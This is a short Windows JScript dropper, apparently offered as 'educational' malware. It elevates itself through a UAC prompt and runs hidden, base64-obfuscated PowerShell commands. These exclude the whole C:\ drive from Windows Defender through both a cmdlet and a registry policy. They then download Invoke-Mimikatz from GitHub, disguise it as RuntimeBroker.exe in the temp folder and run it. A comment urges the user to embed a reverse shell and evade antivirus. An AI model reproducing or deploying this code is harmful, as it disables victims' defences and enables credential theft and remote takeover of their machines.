// Coded on - Apr 2025
// Author - Acemapper
// For Education purposes only. I am not responsible if used for any malicious purposes

EnsureElevatedPrivileges();

function EnsureElevatedPrivileges() {

    if (!WScript.Arguments.Named.Exists("elevate")) {

        new ActiveXObject("Shell.Application").ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);

        WScript.Quit();

    }

}

var WshShell = new ActiveXObject("Wscript.Shell");


// UTF-16LE to Base 64 decode for windows
WshShell.run("powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA", 0, false);


// UTF-16LE to Base 64 decode for windows
WshShell.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==", 0, false);

// UTF-16LE to Base 64 decode for windows
// Change the payload here. Embedd the reverse shell here and make sure your exe is not easily detected by AV
WshShell.run("powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AUABvAHcAZQByAHMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAcwBwAGwAbwBpAHQALwBiAGwAbwBiAC8AbQBhAHMAdABlAHIALwBFAHgAZgBpAGwAdAByAGEAdABpAG8AbgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA=", 0, false);



WScript.exit;
